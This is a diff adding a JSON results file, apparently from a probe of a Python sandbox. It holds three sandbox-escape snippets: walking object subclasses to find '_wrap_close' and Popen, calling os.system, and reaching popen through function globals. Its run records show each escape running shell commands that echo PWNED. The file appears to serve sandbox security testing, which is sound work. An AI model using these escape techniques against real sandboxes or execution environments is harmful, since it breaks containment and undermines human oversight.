@@ -1,0 +1,59 @@
+{
+  "probe": "P12",
+  "config": "default",
+  "codes": [
+    "subs = ().__class__.__base__.__subclasses__()\nnames = [c.__name__ for c in subs]\nmsg = 'SUBS ' + str(len(subs)) + ' ' + str('_wrap_close' in names) + ' ' + str('Popen' in names)\nprint(msg)\nmsg",
+    "msg = \"SYSTEM \" + str(__import__(\"os\").system(\"echo PWNED\"))\nprint(msg)\nmsg",
+    "wc = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close']\nmsg = 'WRAP ' + wc[0].__init__.__globals__['popen']('echo PWNED2').read()\nprint(msg)\nmsg"
+  ],
+  "runs": [
+    {
+      "ok": true,
+      "stdout": "SUBS 709 True True\n",
+      "error": null,
+      "context_keys": [
+        "msg",
+        "names",
+        "subs"
+      ],
+      "host_builtins_leak": false,
+      "ms": 2.8,
+      "started": 1795377311.352601
+    },
+    {
+      "ok": true,
+      "stdout": "SYSTEM 0\n",
+      "error": null,
+      "context_keys": [
+        "msg",
+        "names",
+        "subs"
+      ],
+      "host_builtins_leak": false,
+      "ms": 5.1,
+      "started": 1795377311.355613
+    },
+    {
+      "ok": true,
+      "stdout": "WRAP PWNED2\n\n",
+      "error": null,
+      "context_keys": [
+        "msg",
+        "names",
+        "subs",
+        "wc"
+      ],
+      "host_builtins_leak": false,
+      "ms": 7.0,
+      "started": 1795377311.360789
+    }
+  ],
+  "setup_ms": 4.1,
+  "done": true,
+  "killed": null,
+  "exit_code": 0,
+  "wall_s": 0.38,
+  "peak_tree_rss_gb": 0.068,
+  "calls": [],
+  "child_log_tail": "PWNED\n"
+}
